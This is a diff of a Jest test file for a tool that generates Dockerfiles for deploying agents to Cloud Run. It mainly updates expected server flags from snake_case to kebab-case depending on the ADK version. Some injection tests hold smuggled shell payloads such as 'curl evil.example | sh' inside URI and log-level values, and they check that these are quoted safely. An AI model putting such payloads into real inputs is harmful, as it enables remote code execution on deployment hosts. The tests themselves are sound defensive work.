@@ -143,15 +143,89 @@ describe('createDockerFileContent', () => {
     expect(content).toContain('npx adk api_server');
   });
 
-  it('should include other options in adkServerOptions', () => {
+  it('should include other options in adkServerOptions using kebab-case flags', () => {
     const content = createDockerFileContent({
       ...defaultOptions,
       allowOrigins: 'http://example.com',
+      artifactServiceUri: 'gs://my-artifact-bucket',
+      sessionServiceUri: 'memory://',
+      memoryServiceUri: 'rag://my-corpus',
       otelToCloud: true,
     });
-    expect(content).toContain("--allow_origins='http://example.com'");
-    expect(content).toContain('--otel_to_cloud');
+    expect(content).toContain("--log-level='info'");
+    expect(content).toContain("--allow-origins='http://example.com'");
+    expect(content).toContain(
+      "--artifact-service-uri='gs://my-artifact-bucket'",
+    );
+    expect(content).toContain("--session-service-uri='memory://'");
+    expect(content).toContain("--memory-service-uri='rag://my-corpus'");
+    expect(content).toContain('--otel-to-cloud');
+    expect(content).not.toContain('--log_level=');
+    expect(content).not.toContain('--allow_origins=');
+    expect(content).not.toContain('--artifact_service_uri=');
+    expect(content).not.toContain('--session_service_uri=');
+    expect(content).not.toContain('--memory_service_uri=');
+    expect(content).not.toContain('--otel_to_cloud');
+    expect(content).not.toContain('.local/bin');
   });
+
+  it.each(['2.5.0', '2.5.0-rc.1', '3.0.0', 'latest'])(
+    'should emit kebab-case flags when adkVersion is %s',
+    (adkVersion) => {
+      const content = createDockerFileContent({
+        ...defaultOptions,
+        adkVersion,
+        allowOrigins: 'http://example.com',
+        artifactServiceUri: 'gs://my-artifact-bucket',
+        sessionServiceUri: 'memory://',
+        memoryServiceUri: 'rag://my-corpus',
+        otelToCloud: true,
+      });
+      expect(content).toContain("--log-level='info'");
+      expect(content).toContain("--allow-origins='http://example.com'");
+      expect(content).toContain(
+        "--artifact-service-uri='gs://my-artifact-bucket'",
+      );
+      expect(content).toContain("--session-service-uri='memory://'");
+      expect(content).toContain("--memory-service-uri='rag://my-corpus'");
+      expect(content).toContain('--otel-to-cloud');
+      expect(content).not.toContain('--log_level=');
+      expect(content).not.toContain('--allow_origins=');
+      expect(content).not.toContain('--artifact_service_uri=');
+      expect(content).not.toContain('--session_service_uri=');
+      expect(content).not.toContain('--memory_service_uri=');
+      expect(content).not.toContain('--otel_to_cloud');
+    },
+  );
+
+  it.each(['2.4.0', '^2.4.0', '~2.4', 'v2.4.0', '1.0.0'])(
+    'should fall back to snake_case flags when adkVersion is %s (< 2.5.0)',
+    (adkVersion) => {
+      const content = createDockerFileContent({
+        ...defaultOptions,
+        adkVersion,
+        allowOrigins: 'http://example.com',
+        artifactServiceUri: 'gs://my-artifact-bucket',
+        sessionServiceUri: 'memory://',
+        memoryServiceUri: 'rag://my-corpus',
+        otelToCloud: true,
+      });
+      expect(content).toContain("--log_level='info'");
+      expect(content).toContain("--allow_origins='http://example.com'");
+      expect(content).toContain(
+        "--artifact_service_uri='gs://my-artifact-bucket'",
+      );
+      expect(content).toContain("--session_service_uri='memory://'");
+      expect(content).toContain("--memory_service_uri='rag://my-corpus'");
+      expect(content).toContain('--otel_to_cloud');
+      expect(content).not.toContain('--log-level=');
+      expect(content).not.toContain('--allow-origins=');
+      expect(content).not.toContain('--artifact-service-uri=');
+      expect(content).not.toContain('--session-service-uri=');
+      expect(content).not.toContain('--memory-service-uri=');
+      expect(content).not.toContain('--otel-to-cloud');
+    },
+  );
 
   it('should reject logLevel/allowOrigins/sessionServiceUri/artifactServiceUri containing a newline', () => {
     // These reach the shell-interpreted CMD line via adkServerOptions, so a
@@ -218,12 +292,12 @@ describe('createDockerFileContent', () => {
       sessionServiceUri: 'memory://; curl evil.example | sh #',
       artifactServiceUri: 'gs://bucket; curl evil.example | sh #',
     });
-    expect(content).toContain("--log_level='info; curl evil.example | sh #'");
+    expect(content).toContain("--log-level='info; curl evil.example | sh #'");
     expect(content).toContain(
-      "--session_service_uri='memory://; curl evil.example | sh #'",
+      "--session-service-uri='memory://; curl evil.example | sh #'",
     );
     expect(content).toContain(
-      "--artifact_service_uri='gs://bucket; curl evil.example | sh #'",
+      "--artifact-service-uri='gs://bucket; curl evil.example | sh #'",
     );
   });
 
@@ -233,7 +307,7 @@ describe('createDockerFileContent', () => {
       memoryServiceUri: 'rag://corpus; curl evil.example | sh #',
     });
     expect(content).toContain(
-      "--memory_service_uri='rag://corpus; curl evil.example | sh #'",
+      "--memory-service-uri='rag://corpus; curl evil.example | sh #'",
     );
   });
 
@@ -243,7 +317,7 @@ describe('createDockerFileContent', () => {
       logLevel: "info'; curl evil.example | sh #",
     });
     expect(content).toContain(
-      "--log_level='info'\\''; curl evil.example | sh #'",
+      "--log-level='info'\\''; curl evil.example | sh #'",
     );
   });
 
@@ -361,7 +435,7 @@ describe('deployToCloudRun', () => {
     agentPath: 'path/to/agent',
     serviceName: 'test-service',
     tempFolder: '/tmp/test-deploy',
-    adkVersion: '1.0.0',
+    adkVersion: '2.5.0',
     project: 'test-project',
     region: 'us-central1',
     port: 8080,
@@ -716,7 +790,7 @@ describe('deployToCloudRun', () => {
   });
 
   it('should install the requested adkVersion in the Dockerfile', async () => {
-    await deployToCloudRun(defaultOptions);
+    await deployToCloudRun({...defaultOptions, adkVersion: '1.0.0'});
 
     expect(saveToFile).toHaveBeenCalledWith(
       path.join('/tmp/test-deploy', 'Dockerfile'),
@@ -790,7 +864,7 @@ describe('deployToCloudRun', () => {
       expect(saveToFile).toHaveBeenCalledWith(
         path.join('/tmp/test-deploy', 'Dockerfile'),
         expect.stringContaining(
-          "--artifact_service_uri='gs://my-artifact-bucket' --session_service_uri='sqlite:///tmp/sessions.db'",
+          "--artifact-service-uri='gs://my-artifact-bucket' --session-service-uri='sqlite:///tmp/sessions.db'",
         ),
       );
     });
@@ -803,7 +877,7 @@ describe('deployToCloudRun', () => {
 
       expect(saveToFile).toHaveBeenCalledWith(
         path.join('/tmp/test-deploy', 'Dockerfile'),
-        expect.stringContaining("--memory_service_uri='rag://my-corpus'"),
+        expect.stringContaining("--memory-service-uri='rag://my-corpus'"),
       );
     });
   });
